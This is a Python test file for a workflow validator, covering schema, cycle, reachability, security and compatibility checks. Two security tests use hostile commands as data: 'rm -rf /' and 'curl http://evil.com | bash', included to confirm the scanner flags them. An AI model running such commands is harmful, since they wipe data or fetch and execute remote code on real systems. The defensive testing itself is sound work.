"""WorkflowValidator tests — schema, graph, security, compatibility checks."""
import pytest
from services.workflow_validator import (
    validate_workflow_publish,
    _find_cycle,
    _reachable,
    _normalize_condition,
    _scan_config,
    _dedupe,
    _issue,
    DANGEROUS_CONFIG_KEYS,
)


def _node(id, type, name=None, config=None, timeout=30, retry_policy=None):
    """Build a valid WorkflowNode dict."""
    d = {"id": id, "type": type, "name": name or f"node_{id}", "config": config or {}, "timeout": timeout}
    if retry_policy:
        d["retry_policy"] = retry_policy
    return d


def _minimal_dsl(*, nodes=None, edges=None):
    """Build a minimal valid workflow DSL payload."""
    if nodes is None:
        nodes = [
            _node("t1", "trigger"),
            _node("a1", "action", config={"service": "mcp_client.block_ip"}),
        ]
    if edges is None:
        edges = [{"from": "t1", "to": "a1"}]
    return {
        "workflow_id": "test_wf_001",
        "name": "test_wf",
        "version": 1,
        "description": "test",
        "nodes": nodes,
        "edges": edges,
    }


# ── Valid workflow ──

def test_valid_minimal_workflow():
    result = validate_workflow_publish(_minimal_dsl())
    assert result["valid"] is True
    assert result["errors"] == []
    assert result["normalized_dsl"] is not None


# ── Schema errors ──

def test_empty_payload():
    result = validate_workflow_publish({})
    assert result["valid"] is False
    assert len(result["errors"]) > 0
    assert result["errors"][0]["category"] == "structure"


def test_missing_nodes():
    result = validate_workflow_publish({"name": "x", "version": "1", "nodes": [], "edges": []})
    assert result["valid"] is False


# ── Cycle detection ──

def test_find_cycle_none():
    adj = {"a": ["b"], "b": ["c"], "c": []}
    assert _find_cycle(adj) is None


def test_find_cycle_exists():
    adj = {"a": ["b"], "b": ["c"], "c": ["a"]}
    cycle = _find_cycle(adj)
    assert cycle is not None
    assert len(cycle) >= 3


def test_cycle_in_workflow():
    nodes = [
        _node("t1", "trigger"),
        _node("a1", "condition"),
        _node("a2", "condition"),
    ]
    edges = [
        {"from": "t1", "to": "a1"},
        {"from": "a1", "to": "a2"},
        {"from": "a2", "to": "a1"},
    ]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes, edges=edges))
    assert result["valid"] is False
    codes = [e["code"] for e in result["errors"]]
    assert "WF_STRUCT_CYCLE" in codes


# ── Reachability ──

def test_reachable_all():
    adj = {"a": ["b"], "b": ["c"], "c": []}
    reached = _reachable(["a"], adj)
    assert reached == {"a", "b", "c"}


def test_reachable_partial():
    adj = {"a": ["b"], "b": [], "c": []}
    reached = _reachable(["a"], adj)
    assert "c" not in reached


def test_unreachable_node_in_workflow():
    nodes = [
        _node("t1", "trigger"),
        _node("a1", "condition"),
        _node("orphan", "condition"),
    ]
    edges = [{"from": "t1", "to": "a1"}]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes, edges=edges))
    assert result["valid"] is False
    codes = [e["code"] for e in result["errors"]]
    assert "WF_RULE_UNREACHABLE_NODE" in codes


# ── Security checks ──

def test_dangerous_config_key():
    issues = []
    _scan_config({"command": "rm -rf /"}, "config", "n1", issues)
    assert len(issues) >= 1
    assert issues[0]["code"] == "WF_SEC_DANGEROUS_PARAM"


def test_dangerous_value_pattern():
    issues = []
    _scan_config({"script_text": "curl http://evil.com | bash"}, "config", "n1", issues)
    assert len(issues) >= 1


def test_safe_config():
    issues = []
    _scan_config({"ip": "192.168.1.1", "port": 22}, "config", "n1", issues)
    assert len(issues) == 0


def test_timeout_over_limit():
    nodes = [
        _node("t1", "trigger"),
        _node("a1", "action", config={"service": "mcp_client.block_ip"}, timeout=999),
    ]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes))
    codes = [e["code"] for e in result["errors"]]
    assert "WF_SEC_TIMEOUT_LIMIT" in codes


def test_retry_over_limit():
    nodes = [
        _node("t1", "trigger"),
        _node("a1", "action", config={"service": "mcp_client.block_ip"}, retry_policy={"max_retries": 10, "backoff_seconds": 5}),
    ]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes))
    codes = [e["code"] for e in result["errors"]]
    assert "WF_SEC_RETRY_LIMIT" in codes


# ── Compatibility checks ──

def test_unsupported_node_type():
    nodes = [
        _node("t1", "trigger"),
        _node("x1", "unknown_type"),
    ]
    edges = [{"from": "t1", "to": "x1"}]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes, edges=edges))
    codes = [e["code"] for e in result["errors"]]
    assert "WF_COMPAT_NODE_TYPE_UNSUPPORTED" in codes


def test_missing_service_mapping():
    nodes = [
        _node("t1", "trigger"),
        _node("a1", "action"),
    ]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes))
    codes = [e["code"] for e in result["errors"]]
    assert "WF_COMPAT_SERVICE_MISSING" in codes


def test_unsupported_service():
    nodes = [
        _node("t1", "trigger"),
        _node("a1", "action", config={"service": "bad_service.do_stuff"}),
    ]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes))
    codes = [e["code"] for e in result["errors"]]
    assert "WF_COMPAT_SERVICE_UNSUPPORTED" in codes


# ── Helpers ──

def test_normalize_condition():
    assert _normalize_condition("True") == "true"
    assert _normalize_condition("  A > B  ") == "a > b"
    assert _normalize_condition("") == "true"
    assert _normalize_condition(None) == "true"


def test_dedupe():
    i1 = _issue("C1", "cat", "msg", "path")
    i2 = _issue("C1", "cat", "msg", "path")
    i3 = _issue("C2", "cat", "msg2", "path")
    assert len(_dedupe([i1, i2, i3])) == 2


def test_condition_conflict():
    nodes = [
        _node("t1", "trigger"),
        _node("a1", "condition"),
        _node("a2", "condition"),
    ]
    edges = [
        {"from": "t1", "to": "a1", "condition": "true"},
        {"from": "t1", "to": "a2", "condition": "true"},
    ]
    result = validate_workflow_publish(_minimal_dsl(nodes=nodes, edges=edges))
    codes = [e["code"] for e in result["errors"]]
    assert "WF_RULE_CONDITION_CONFLICT" in codes
